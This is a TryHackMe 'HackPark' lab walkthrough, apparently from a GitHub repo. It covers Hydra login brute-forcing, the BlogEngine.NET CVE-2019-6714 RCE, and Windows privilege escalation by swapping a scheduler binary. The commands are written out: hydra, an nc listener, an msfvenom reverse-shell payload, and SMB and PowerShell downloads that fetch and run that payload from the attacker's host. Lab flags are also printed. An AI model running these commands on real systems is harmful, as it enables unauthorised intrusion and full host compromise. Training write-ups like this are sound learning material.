# 🎡 HackPark — TryHackMe Walkthrough

> Bruteforce a website's login with **Hydra**, identify and use a public exploit, then escalate privileges on this Windows machine.  
> Room: **[HackPark](https://tryhackme.com/room/hackpark)**


<p align="center">
  <img src="https://i.postimg.cc/1XLKQQhP/8c8b2105d74035ca43531681439b457e.png" />
</p>

<p align="center">
  <a href="https://tryhackme.com/room/hackpark"><img src="https://img.shields.io/badge/TryHackMe-HackPark-red?logo=tryhackme&logoColor=white" alt="TryHackMe"></a>
  <img src="https://img.shields.io/badge/Difficulty-Intermediate-orange" alt="Difficulty">
  <img src="https://img.shields.io/badge/Focus-BruteForce%20%7C%20RCE%20%7C%20PrivEsc-blue" alt="Focus">
  <img src="https://img.shields.io/badge/Platform-Windows-black" alt="Platform">
</p>

---

## 🧠 Overview

This walkthrough documents the exploitation of the **HackPark** TryHackMe room. Goals:

- Brute-force a web login with Hydra  
- Exploit **BlogEngine.NET 3.3.6** (CVE-2019-6714) to get RCE  
- Pivot to a stable shell and perform Windows privilege escalation via a vulnerable scheduler service


> Replace `MACHINE_IP` with the actual target IP when running commands. CLI snippets retain the original targets/paths from the room where applicable.

---

## 🔎 Tools (click to open)

We used these tools — click a name for install & basic usage:

- [Hydra](https://github.com/vanhauser-thc/thc-hydra) — fast login cracker. *(Alternative: [Medusa](https://github.com/lanjelot/medusa))*
- [Netcat (`nc`)](https://nc110.sourceforge.io/) — simple TCP/UDP connections and reverse shells. *(Alternative: `socat` or `ncat` from Nmap)*
- [msfvenom / Metasploit](https://www.metasploit.com/) — payload generation and exploitation. *(Alternative: manual payloads with `msfvenom` + `nc` for listener)*
- [Exploit-DB / searchsploit](https://www.exploit-db.com/) — public exploit archive. *(Alternative: CVE search on NVD or GitHub)*
- [impacket smbserver](https://github.com/SecureAuthCorp/impacket) — host SMB share for file transfer. *(Alternative: Python `http.server` + PowerShell download)*
- [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) — Windows privilege escalation enumeration. *(Alternative: [SharpUp](https://github.com/HarmJ0y/SharpUp))*

---

## 🧩 Task 1 — Deploy & Recon

Deploy the machine and visit:

```
http://MACHINE_IP
```

**Q:** What clown is on the homepage?  
**A:** `Pennywise`

---

## 🔐 Task 2 — Brute-force the login (Hydra)

The login form uses a **POST** request. Example captured request:

```
POST /Account/login.aspx?ReturnURL=%2fadmin%2f HTTP/1.1
Host: MACHINE_IP
Content-Type: application/x-www-form-urlencoded

__VIEWSTATE=...&__EVENTVALIDATION=...&ctl00%24MainContent%24LoginUser%24UserName=asd&ctl00%24MainContent%24LoginUser%24Password=asd&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
```

**Hydra command used (example):**

```bash
hydra -v -l admin -P /usr/share/wordlists/rockyou.txt MACHINE_IP http-post-form "/Account/login.aspx:__VIEWSTATE=<value>&__EVENTVALIDATION=<value>&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
```

**Result:**  
`admin:1qaz2wsx`

> Hydra supports many modules/protocols — you can brute-force SSH, FTP, RDP, SMB and more with similar syntax.

---

## 🧨 Task 3 — Exploit BlogEngine.NET (CVE-2019-6714)

After logging into the admin panel we identify the BlogEngine.NET version: **3.3.6.0**.

Search Exploit-DB for `BlogEngine.NET 3.3.6` and locate **CVE-2019-6714** — an RCE via the editor page `/admin/app/editor/editpost.cshtml`.

Use the public exploit to upload a reverse shell payload and trigger it.

Start a listener:

```bash
nc -lnvp 9001
```

When exploited, we receive a connection:

```
whoami
iis apppoollog
```

Webserver is running as `iis apppoollog`.

---

## 🛠 Task 4 — Windows Privilege Escalation (Scheduler)

Collect system info (`systeminfo`) — the box runs:

```
Windows Server 2012 R2 Standard (6.3.9600)
```

Further enumeration reveals a suspicious service: **WindowsScheduler** (SystemScheduler) located in:

```
C:\Program Files (x86)\SystemScheduler```

Files of interest inside the folder include `Message.exe`, `Scheduler.exe`, `Privilege.exe`, and others.

**Approach:** Replace `Message.exe` with a malicious binary that spawns a reverse shell. The scheduler runs with elevated rights and will execute the dropped binary.

---

### Payload generation (msfvenom)

Example msfvenom command used:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=9002 -f exe -o Message.exe
```

Host the payload via SMB and copy it to the target:

```bash
sudo impacket-smbserver smbfolder .
# On target (via initial shell):
cd "C:\Program Files (x86)\SystemScheduler"
ren Message.exe Message.exe.bak
copy \YOUR_IP\smbfolder\Message.exe
```

After the scheduler executes the new `Message.exe`, you get a reverse shell as **SYSTEM / Administrator**.

---

## 🏁 Flags

<details>
<summary>👤 User Flag (Jeff)</summary>

```
759bd8af507517bcfaede78a21a73e39
```

</details>

<details>
<summary>👑 Root Flag (Administrator)</summary>

```
7e13d97f05f7ceb9881a3eb3d78d3e72
```

</details>

---

## 🔎 Extra — PrivEsc without Metasploit

Instead of Metasploit, you can use `msfvenom` to create a plain executable and host it with `smbserver.py` (impacket) or a simple HTTP server and pull it using PowerShell:

```powershell
powershell -c "Invoke-WebRequest -Uri 'http://YOUR_IP/Message.exe' -OutFile C:\Windows\Temp\Message.exe"
Start-Process C:\Windows\Temp\Message.exe
```

Use **winPEAS.bat** to enumerate the machine for further misconfigurations:

- Original install time discovered via `winPEAS` / `systeminfo`:  
  `8/3/2019, 10:43:23 AM`

---

## ✅ Summary & Recommendations

**What we did:**

1. Bruteforced admin credentials with Hydra.  
2. Found BlogEngine.NET version and exploited CVE-2019-6714 to get RCE.  
3. Switched to a stable reverse shell and enumerated the host.  
4. Replaced scheduled binary to gain Administrator-level code execution.  
5. Collected user and root flags.
  ---

### ⭐ If this helped you, consider leaving a star on the repo!

**Safety:** Only run these steps on authorized training machines — never against production or external systems.

---

